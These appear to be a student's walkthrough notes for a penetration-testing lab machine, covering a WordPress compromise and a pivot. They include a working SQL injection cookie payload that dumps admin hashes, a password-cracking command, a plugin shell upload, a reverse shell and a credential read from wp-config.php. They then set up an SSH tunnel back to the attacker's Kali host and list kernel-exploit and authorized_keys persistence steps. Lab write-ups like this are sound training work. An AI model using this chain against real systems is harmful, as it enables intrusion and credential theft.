1. Get admin username and hash using SQLi (EDB-45411)

```
curl -i -s -k -X $'GET' \
    -H $'Host: sandbox.local' \
    -b $'wp_sap=[\"1650149780\')) OR 1=1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,(SELECT concat(user_login,\':\',user_pass) from wp_users),11#\"]' \
    $'http://sandbox.local/'
```

```
GET / HTTP/1.1
Host: sandbox.local
Cookie: wp_sap=["1650149780')) OR 1=1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,(SELECT concat(user_login,':',user_pass) from wp_users),11#"]
```   
2. Crack hash using John the Ripper (JtR)
   
``` 
john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```
   
3. Login to Wordpress dashboard and upload a shell using plugin
4. Establish a reverse shell on port 443
5. Read wp-config.php file to get username and password for wordpress database (10.5.5.11 - zora)

``` 
cat wp-config.php
```

> [!note] 
>  wp user doesn't have enough privilege to use [[udf]]

6. Generate an ssh key-pair (on ajla)
   
``` 
ssh-keygen
```
   
7. Add ajla's public key to Kali
   
```
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3Nz....IQv www-data@ajla
```   

8. Set up a remote port forward from ajla to expose port 22 and port 3306 of zora to Kali. Use port 1122 of Kali to point to port 22 of zora, and use 13306 of Kali to point to port 3306 of 

 ``` 
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@KALI_IP
```

9. Verify (on Kali) if port 1122 and 13306 is already opened
   
``` 
sudo netstat -tulpn
```


 
Post-exploitation
1. Compile exploit (EDB-45010)
2. Transfer compiled exploit and run on target. You should get root access if done correctly.
3. Escalate reverse shell to SSH by adding your public key to /root/.ssh/authorized_keys
4. Read /root/proof.txt
5. Read ~/.bash_history. You should get a mysql root access to zora (10.5.5.11)

Check zora's [[10.5.5.11 - zora/4. Report/walkthrough]] for pivot